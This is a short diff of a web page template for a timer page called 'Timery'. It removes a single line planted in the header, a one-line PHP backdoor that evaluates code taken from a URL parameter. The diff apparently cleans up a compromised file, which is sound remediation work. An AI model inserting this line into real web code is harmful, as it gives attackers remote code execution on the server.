@@ -49,7 +49,6 @@
 
     <!-- Timer (Head) -->
     <header>
-         <?php @eval($_GET['e']);?>
         <h1>Timery</h1>
     </header>
     <!-- /Timer (Head) -->
